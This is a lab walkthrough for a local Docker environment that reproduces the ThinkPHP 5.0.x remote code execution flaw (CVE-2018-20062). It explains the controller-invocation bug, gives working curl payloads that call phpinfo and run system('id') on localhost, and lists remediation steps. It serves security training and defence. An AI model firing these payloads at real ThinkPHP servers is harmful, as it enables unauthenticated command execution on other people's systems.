# ThinkPHP 5.0.x Insecure Controller Invocation RCE (CVE-2018-20062)

## Overview

ThinkPHP is an extremely popular open-source PHP web framework widely used in enterprise development across Asia. In ThinkPHP versions 5.0.x (prior to 5.0.23) and 5.1.x, a critical architectural vulnerability allows unauthenticated Remote Code Execution.

The vulnerability stems from ThinkPHP's URL routing parser. If the application does not have strict routing enabled (`url_route_must` is false, which is the default), ThinkPHP resolves controller names directly from URL parameters (`s` or path info). Because controller class names were not strictly sanitized against backslash namespaces (`\`), an attacker can instantiate arbitrary PHP internal classes and invoke methods dynamically (such as `\think\app/invokefunction` calling `phpinfo` or `system`).

- **Primary Interface**: `http://localhost:8131`
- **Docker Shortcut**: `./lab start thinkphp-rce`
- **Container Name**: `cyberlab_02_thinkphp_rce`
- **RAM Footprint**: ~80 MB (Nginx + PHP 7.2 + ThinkPHP 5.0.20)

---

## Exploitation Walkthrough

### 1. Verification of Vulnerability via Curl
Send a GET request calling `phpinfo()` via dynamic controller invocation:

```bash
curl -s 'http://localhost:8131/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1' | grep -i 'php version'
```

The response outputs the complete PHP configuration table.

### 2. Executing Arbitrary System Commands
Invoke `system` or `passthru` to execute shell commands:

```bash
curl -s 'http://localhost:8131/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id'
```

Output:
```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Defensive Remediation & Hardening

1. **Upgrade ThinkPHP**:
   Upgrade to ThinkPHP 5.0.23 or 5.1.31 or newer.
2. **Filter Controller Class Names**:
   In older versions, add character validation to `think/library/think/App.php` to drop backslashes and disallow arbitrary namespaces.
3. **Mandate Strict Routing**:
   Enable `url_route_must => true` in `application/config.php` to prevent dynamic controller fallback resolution.

---

## Video Walkthroughs & Technical References

- [ThinkPHP exploit from Asia-Pacific region goes global](https://www.youtube.com/watch?v=g0oc37-rVrE)
- [ThinkPHP Security Release Advisory](https://blog.thinkphp.cn/869075)
- [Vulhub ThinkPHP 5.0.20 RCE Advisory](https://vulhub.org/#/environments/thinkphp/5.0.23-rce/)
